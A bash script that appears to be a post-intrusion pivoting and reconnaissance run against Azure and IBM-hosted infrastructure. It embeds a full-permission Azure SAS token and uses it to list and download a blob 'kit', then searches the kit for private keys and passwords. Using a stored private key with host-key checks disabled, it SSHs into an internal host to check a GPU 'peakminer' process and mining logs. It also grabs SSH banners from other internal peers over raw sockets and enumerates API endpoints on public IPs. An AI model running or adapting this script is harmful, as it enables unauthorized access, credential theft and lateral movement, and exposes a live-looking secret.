#!/bin/bash
# pivot10 - Azure blob SAS verdict (2 vantages), .24 in-VNet share proof, silent-peer banner probe, .21 API enum
exec >/tmp/pivot10-9927.txt 2>&1
set +e
say(){ echo; echo "==$1"; }
SAS='sv=2015-04-05&ss=b&srt=sco&sp=rwdlacup&st=2026-11-20T17%3A32%3A26.0000000Z&se=2026-11-27T17%3A37%3A26.0000000Z&spr=https&sig=P2P1GPVXTMXnTT5%2FQXD9nh2yvMkZIYMHaeeA4YtaZxU%3D'
H=ulbatchkit4620.blob.core.windows.net
K=/tmp/kc/ibm_key.pem
say M10-START-$(date -u +%s)

say Adns
getent hosts $H; echo "rc=$?"
cat /etc/resolv.conf | head -6
command -v dig nslookup host 2>/dev/null

say Bblob-runner
curl -s -m 25 -o /tmp/b1.xml -w 'v1 rc=%{http_code} size=%{size_download}\n' "https://$H/kit?restype=container&comp=list&$SAS"
head -c 400 /tmp/b1.xml; echo
curl -s -m 25 --http1.1 -o /tmp/b2.xml -w 'http11 rc=%{http_code} size=%{size_download}\n' "https://$H/kit?restype=container&comp=list&$SAS"
IP=$(python3 - <<'PY'
import socket
try: print(socket.gethostbyname('ulbatchkit4620.blob.core.windows.net'))
except Exception as e: print('')
PY
)
echo "RESOLVED=[$IP]"
if [ -n "$IP" ]; then
  curl -s -m 25 --resolve "$H:443:$IP" -o /tmp/b3.xml -w 'resolve rc=%{http_code} size=%{size_download}\n' "https://$H/kit?restype=container&comp=list&$SAS"
  head -c 400 /tmp/b3.xml; echo
fi
python3 - <<'PY'
import re
try:
  x=open('/tmp/b1.xml',errors='ignore').read()+open('/tmp/b2.xml',errors='ignore').read()+open('/tmp/b3.xml',errors='ignore').read()
  print('BLOBS', re.findall(r'<Name>([^<]+)</Name>',x)[:40])
except Exception as e: print('ERR',e)
PY
curl -s -m 40 -o /tmp/kit2.tgz -w 'kitdl rc=%{http_code} size=%{size_download}\n' "https://$H/kit/fleet-kit-srb.tar.gz?$SAS"
sha256sum /tmp/kit2.tgz 2>/dev/null; tar tzf /tmp/kit2.tgz 2>/dev/null | head -20
mkdir -p /tmp/kx2 && tar xzf /tmp/kit2.tgz -C /tmp/kx2 2>/dev/null; find /tmp/kx2 -maxdepth 3 -type f | head -20
grep -rIlE 'PRIVATE KEY|password|secret' /tmp/kx2 2>/dev/null | head
curl -s -m 20 -o /dev/null -w 'negctl rc=%{http_code}\n' "https://$H/kit?restype=container&comp=list&sv=2015-04-05&sig=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%3D"

say Cblob-24
ssh -i $K -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 ubuntu@10.243.0.24 \
 "getent hosts $H; curl -s -m 25 -o /tmp/b4.xml -w 'from24 rc=%{http_code} size=%{size_download}\\n' 'https://$H/kit?restype=container&comp=list&$SAS'; head -c 400 /tmp/b4.xml" 2>&1 | tail -8

say Dproof-24
ssh -i $K -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 ubuntu@10.243.0.24 \
 'hostname; nvidia-smi -L; nvidia-smi --query-gpu=index,name,memory.total,serial,uuid --format=csv,noheader; systemctl is-active nv-t19 2>/dev/null; pgrep -af peakminer | head -2; ls /var/log/t19 /opt/t19/logs 2>/dev/null; sudo -n grep -ahoE "accepted \([0-9]+/[0-9]+\)|difficulty [0-9]+|[0-9.]+ TH/s" /opt/t19/logs/*.log /var/log/t19/*.log 2>/dev/null | tail -8; sudo -n crontab -l 2>/dev/null | head -4' 2>&1 | tail -25

say Esilent-peers
for ip in 10.243.0.26 10.243.0.27 10.243.0.30 10.243.0.31; do
  echo "-- $ip"
  timeout 8 bash -c "exec 3<>/dev/tcp/$ip/22; printf 'SSH-2.0-OpenSSH_8.9p1\r\n' >&3; timeout 6 head -c 200 <&3 | tr -d '\r'" 2>&1 | head -3
  timeout 12 ssh -vv -i /tmp/kc/ibm_key.pem -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 t19@$ip true 2>&1 | grep -E 'Connect|banner|kex|Remote protocol|Permission|refused' | head -5
done

say F21-api
SSH="ssh -i $K -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 ubuntu@10.243.0.24"
$SSH 'for p in / /swagger/index.html /swagger/v1/swagger.json /openapi.json /api /healthz /metrics /health; do echo -n "$p "; curl -sk -m 6 -o /tmp/o -w "%{http_code} %{size_download}\n" "https://20.125.42.21$p"; done; head -c 200 /tmp/o' 2>&1 | tail -12

say Gvcenter-bundle
$SSH 'curl -sk -m 8 https://20.109.152.114/ | grep -oE "(src|href)=\"[^\"]+\"" | head -12' 2>&1 | tail -14

say M10-END
